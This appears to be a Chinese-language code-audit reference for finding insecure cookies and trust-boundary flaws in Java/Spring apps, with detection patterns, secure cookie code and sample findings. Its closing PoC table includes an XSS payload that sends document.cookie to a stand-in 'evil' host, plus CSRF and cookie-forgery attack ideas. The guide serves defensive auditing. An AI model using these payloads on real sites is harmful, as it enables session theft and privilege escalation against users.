# Cookie & Trust Boundary Family（Insecure Cookie / Trust Boundary Violation）

## sink 模式速查

### Insecure Cookie
- `new Cookie(name, value)` 后未调 `setSecure(true)` + `setHttpOnly(true)` 即 `addCookie`
- 显式 `cookie.setSecure(false)` / `cookie.setHttpOnly(false)`
- `ResponseCookie.from(...).secure(false).httpOnly(false).build()`
- 配置 `server.servlet.session.cookie.secure=false` (Spring Boot)

### Trust Boundary Violation
- 把用户输入直接存到 `HttpSession` 不做校验，后续读出来用作信任决策
- 把外部 token / cookie 内容当作"已认证身份"使用而不验证

## 数据流追溯重点

### Insecure Cookie
fast-path：看 Cookie 构造后 `addCookie` 之前**是否**有 `setSecure(true)` + `setHttpOnly(true)`。

### Trust Boundary
1. 找 `session.setAttribute("trustedXxx", request.getParameter(...))` 模式；
2. 看 setAttribute 时**是否**做了校验 / 类型转换；
3. 后续 `session.getAttribute("trustedXxx")` 是否被用作权限决策。

## 防御机制速查

### Cookie
```java
Cookie cookie = new Cookie("session", token);
cookie.setSecure(true);          // 仅 HTTPS 传输
cookie.setHttpOnly(true);        // JS 不可读
cookie.setSameSite("Strict");    // 或 "Lax",防 CSRF
cookie.setMaxAge(3600);          // 有限期
response.addCookie(cookie);
```

或 Spring Boot 全局配置：
```yaml
server:
  servlet:
    session:
      cookie:
        secure: true
        http-only: true
        same-site: strict
```

### Trust Boundary
- 进入信任域前严格校验：`Long.parseLong(input)` 强转 + 范围检查
- session attribute 名带"untrusted-"前缀，提醒下游再校验

## 常见误判

- ❌ "项目用了 Spring Session" —— 看具体 Cookie 实现，仍需要 setSecure/setHttpOnly
- ❌ "Cookie 只装非敏感数据" —— 必须明确是 UI 偏好/语言切换才能放宽，session/auth/csrf 类 cookie 不可
- ❌ "测试环境不需要 Secure" —— 看是否有 `@Profile("test")` 隔离，否则生产环境同样易感
- ❌ "教学项目"借口

## 证据引用范例

**DEFENDED 时**：
```
defense_analysis: "Line 30 Cookie cookie = new Cookie(\"session\", token);
                  Line 31 cookie.setSecure(true);
                  Line 32 cookie.setHttpOnly(true);
                  Line 33 cookie.setSameSite(\"Strict\");
                  Line 34 response.addCookie(cookie);
                  — Secure + HttpOnly + SameSite=Strict 三道防御齐全."
```

**VULNERABLE 时**：
```
suspicion_reason: "Line 58 Cookie cookie = new Cookie(\"auth-token\", jwt);
                  Line 59 response.addCookie(cookie);
                  — 未调 setSecure / setHttpOnly,Cookie 可在 HTTP 明文中泄露,
                  且 JS 可通过 document.cookie 读到,XSS 时直接获 token."
```

## PoC 模板

| 弱点 | 攻击思路 |
|---|---|
| 无 Secure | 中间人在 HTTP 链路嗅探 Cookie (公共 WiFi / 同子网 ARP 攻击) |
| 无 HttpOnly | 配合 XSS：`<script>fetch('//evil/?'+document.cookie)</script>` |
| 无 SameSite | CSRF：诱导受害者访问 `<img src="https://victim.com/api/transfer?...">` |
| Trust Boundary | 把 `Cookie["isAdmin"]=true` 直接信任的应用，前端伪造 Cookie 即升级权限 |
